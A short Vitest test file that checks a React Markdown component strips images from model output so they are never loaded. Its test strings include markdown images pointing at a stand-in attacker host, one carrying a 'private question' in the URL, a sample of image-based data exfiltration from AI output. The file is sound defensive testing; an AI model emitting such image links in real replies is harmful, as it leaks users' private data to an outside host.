import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import { describe, expect, test } from "vitest";
import { noImages } from "./markdown-no-images";

const render = (markdown: string) =>
  renderToStaticMarkup(createElement(ReactMarkdown, { components: noImages }, markdown));

describe("noImages", () => {
  test("an image written into model output is shown as its alt text and never loaded", () => {
    const html = render("Approvals wait on Finance ![steps](https://evil.example/p?q=private+question)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
    expect(html).toContain("steps");
  });

  test("an image with no alt text renders nothing", () => {
    expect(render("Before ![](https://evil.example/x.png) after")).toBe("<p>Before  after</p>");
  });

  test("ordinary markdown is unaffected", () => {
    expect(render("**Bold** and [a link](https://example.test)")).toBe(
      '<p><strong>Bold</strong> and <a href="https://example.test">a link</a></p>',
    );
  });
});
